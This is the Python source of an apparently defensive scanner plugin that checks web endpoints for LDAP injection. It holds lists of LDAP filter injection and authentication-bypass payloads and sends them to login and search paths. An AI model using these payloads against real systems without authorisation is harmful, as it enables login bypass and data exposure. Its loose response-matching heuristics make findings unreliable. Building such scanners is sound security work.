"""
Plugin 1179: LDAP Injection Detection
=======================================
Detects LDAP injection vulnerabilities by injecting LDAP filter
metacharacters (*, (), &, |, !) into parameters.
"""
import asyncio
import ssl
import urllib.parse

from plugins import NaslPlugin, PluginResult


class LdapInjectionDetection(NaslPlugin):
    PLUGIN_ID = 1179
    NAME = 'LDAP Injection Detection'
    FAMILY = 'Web Applications'
    CVSS_SCORE = 8.6
    DESCRIPTION = (
        'Detects LDAP injection vulnerabilities by injecting LDAP filter '
        'metacharacters (*, (), &, |, !) into parameters. LDAP injection can '
        'lead to authentication bypass, information disclosure, and privilege '
        'escalation.'
    )
    SOLUTION = (
        'Escape LDAP special characters in user input. Use parameterized '
        'LDAP queries. Restrict LDAP query privileges.'
    )
    CVE = []
    PORTS = [80, 443, 8080, 8443, 389, 636]

    LDAP_PAYLOADS = [
        '*',
        '*)(uid=*',
        '|(uid=*))',
        'admin(*))',
        '*)(|(uid=*',
        'admin*',
        '*)(uid=*))(|(uid=*',
        '*)(objectClass=*',
        '*)(cn=*',
        '*|((uid=*))',
    ]

    AUTH_BYPASS_PAYLOADS = [
        '*)(|(uid=*))',
        '*)(uid=*))',
        '*))(|(uid=*',
        'admin*)(|(uid=*',
    ]

    PARAMS = [
        'username', 'user', 'name', 'uid', 'cn', 'search',
        'filter', 'dn', 'bindn', 'password', 'mail',
    ]

    PATHS = [
        '/', '/api/login', '/login', '/api/auth', '/search',
        '/api/search', '/users', '/api/users',
    ]

    async def check_target(self, target: str, port: int | None = None) -> list[PluginResult]:
        results = []

        for port_to_check in (self.PORTS if port is None else [port]):
            try:
                scheme = 'https' if port_to_check in (443, 8443, 636) else 'http'
                ctx = None
                if scheme == 'https':
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE

                host_header = target
                if target in ('127.0.0.1', 'localhost', '::1'):
                    host_header = 'alieninc.tech'

                for payload in self.LDAP_PAYLOADS:
                    for param in self.PARAMS[:5]:
                        for path in self.PATHS[:4]:
                            try:
                                body_text = await self._inject_payload(
                                    target, port_to_check, ctx, host_header, path, param, payload
                                )
                                if body_text and self._detect_ldap_response(body_text, payload):
                                    results.append(PluginResult(
                                        vulnerable=True,
                                        target=target,
                                        port=port_to_check,
                                        cvss_score=self.CVSS_SCORE,
                                        severity='high',
                                        description=(
                                            f'LDAP injection detected via param "{param}" on {path} '
                                            f'(response changed with LDAP metacharacters)'
                                        ),
                                        solution=self.SOLUTION,
                                        evidence=f'Parameter: {param}, payload: {payload}, path: {path}',
                                        references=[
                                            'https://owasp.org/www-community/attacks/LDAP_Injection',
                                            'https://portswigger.net/web-security/ldap-injection',
                                        ]
                                    ))
                                    break
                            except Exception:
                                pass
                        if results:
                            break
                    if results:
                        break

                if not results:
                    for payload in self.AUTH_BYPASS_PAYLOADS:
                        for param in self.PARAMS[:5]:
                            for path in ['/login', '/api/login', '/auth']:
                                try:
                                    body_text = await self._inject_auth_body(
                                        target, port_to_check, ctx, host_header, path, param, payload
                                    )
                                    if body_text and self._detect_auth_bypass(body_text):
                                        results.append(PluginResult(
                                            vulnerable=True,
                                            target=target,
                                            port=port_to_check,
                                            cvss_score=self.CVSS_SCORE,
                                            severity='high',
                                            description=(
                                                f'LDAP injection (auth bypass) detected via param '
                                                f'"{param}" on {path}'
                                            ),
                                            solution=self.SOLUTION,
                                            evidence=f'Parameter: {param}, payload: {payload}, path: {path}',
                                            references=[
                                                'https://owasp.org/www-community/attacks/LDAP_Injection',
                                                'https://portswigger.net/web-security/ldap-injection',
                                            ]
                                        ))
                                        break
                                except Exception:
                                    pass
                            if results:
                                break
                        if results:
                            break

            except (asyncio.TimeoutError, ConnectionRefusedError, OSError, ssl.SSLError):
                pass

        if not results:
            results.append(PluginResult(
                vulnerable=False, target=target, port=port or 0,
                description='No LDAP injection indicators detected on checked ports'
            ))

        return results

    def _detect_ldap_response(self, body: str, payload: str) -> bool:
        indicators = ['"results"', '"users"', '"count"', '"entries"', '"dn"', '"uid"', '"cn"']
        for ind in indicators:
            if ind in body:
                return True
        return False

    def _detect_auth_bypass(self, body: str) -> bool:
        indicators = ['"login":true', '"success":true', '"token"', '"authenticated"', '"valid":true']
        for ind in indicators:
            if ind in body:
                return True
        return False

    async def _inject_payload(self, target: str, port: int, ctx, host_header: str,
                              path: str, param: str, payload: str) -> str | None:
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(target, port, ssl=ctx), timeout=5
            )
            encoded = urllib.parse.quote(payload)
            req = (
                f'GET {path}?{param}={encoded} HTTP/1.1\r\n'
                f'Host: {host_header}\r\n'
                f'User-Agent: Centra/1.0\r\n'
                f'Connection: close\r\n\r\n'
            )
            writer.write(req.encode())
            await writer.drain()
            response = b''
            while True:
                chunk = await asyncio.wait_for(reader.read(4096), timeout=3)
                if not chunk:
                    break
                response += chunk
                if len(response) > 16384:
                    break
            writer.close()
            await writer.wait_closed()
            body = response.split(b'\r\n\r\n', 1)
            return body[1].decode('utf-8', errors='ignore') if len(body) > 1 else None
        except Exception:
            return None

    async def _inject_auth_body(self, target: str, port: int, ctx, host_header: str,
                                path: str, param: str, payload: str) -> str | None:
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(target, port, ssl=ctx), timeout=5
            )
            body_data = f'{param}={urllib.parse.quote(payload)}&password=x'
            req = (
                f'POST {path} HTTP/1.1\r\n'
                f'Host: {host_header}\r\n'
                f'User-Agent: Centra/1.0\r\n'
                f'Content-Type: application/x-www-form-urlencoded\r\n'
                f'Content-Length: {len(body_data)}\r\n'
                f'Connection: close\r\n\r\n{body_data}'
            )
            writer.write(req.encode())
            await writer.drain()
            response = b''
            while True:
                chunk = await asyncio.wait_for(reader.read(4096), timeout=3)
                if not chunk:
                    break
                response += chunk
                if len(response) > 16384:
                    break
            writer.close()
            await writer.wait_closed()
            body = response.split(b'\r\n\r\n', 1)
            return body[1].decode('utf-8', errors='ignore') if len(body) > 1 else None
        except Exception:
            return None
